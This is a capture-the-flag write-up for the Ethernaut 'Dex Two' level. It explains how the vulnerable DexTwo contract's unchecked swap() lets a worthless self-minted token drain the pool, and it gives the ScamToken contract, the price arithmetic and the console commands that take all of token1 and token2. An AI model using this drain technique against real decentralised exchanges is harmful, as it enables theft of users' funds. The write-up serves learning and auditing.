# 23 Dex Two

```
This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way.

You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.

You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.

  Things that might help:

How has the swap method been modified?
```
####  code
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract DexTwo is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}


```




#### Start 


### (1) `drain all balances of token1 and token2 from the DexTwo contract`

Code is slightly different from the previous(Dex) :

function `swap()` don't have `require(((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");`

that means we can use any token to attack.

How do we do ?

.

.

.

We will attack same before in  function `getSwapAmount()`.

calculation equation 
```
(amount * balance contract Dex tokenBuy )/(balance contract Dex tokenSell )
```

This time we can take advantage of the  contract token balance  by using our scam token attack

because we can use the transfer function to transfer our scam token directly into the contract

We must make the balance of the scam token in the contract greater than 0, because if it is 0, there will be a division by 0 problem.

Let's calculate

.

.

We need all 100 token1 in the contract
``` 
    token1 = 100   amount = ?   balance contract Dex tokenBuy = 100   balance contract Dex tokenSell = ?

    token1 = (amount * balance contract Dex tokenBuy )/ balance contract Dex tokenSell

                                                 |   
                                                 |
                                                 |
                                                            
    100   =  ( amount * 100) / balance contract Dex tokenSell

    balance contract Dex tokenSell =  amount

```

`balance contract Dex tokenSell =  amount`

This equation means that

input amount and balance scamtoken in contract must be the same

.


We will use only 1 scam token.

```
    token1 = (1 * 100 )/ 1
    token1 = 100
```
We got all token1 from the contract  and balance token1 in contract = 0 balance scam token in contract = 2

next step We need all 100 token2 in the contract

.

.

.

Now that we cannot define the balance contract Dex tokenSell, we are left with only one variable input `amount`
```
    token2 = 100   amount = ?   balance contract Dex tokenBuy = 100   balance contract Dex tokenSell = 2

    100 = (amount * 100 )/ 2
    amount = 2
```
We get amount scam token for swap is 2 to get all 100 token2 in contract

After all the calculations, let's start.

#### This is the code I used for ScamToken
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract ScamToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("ScamToken", "SCAM")  {
        _mint(msg.sender, initialSupply);
    }
}

```
Use the remix deploy contract `ScamToken ` 


- (1) Call `approve`  for  contract DexTwo in remix  and confirm transaction
- (2) Call `transfer` send 1 scam token to  contract DexTwo in remix  and confirm transaction

#### Open Developer Tools (F12)

- (1) type  `await contract.approve(contract.address,toWei('1000'))`                       and confirm transaction
- (2) type  `await contract.swap(" **address scam token *** ",await contract.token1(),1)`  and confirm transaction
- (3) type  `await contract.swap(" **address scam token *** ",await contract.token2(),2)`  and confirm transaction

Click button Submit instance and confirm transaction 

# !!! we passed !!!

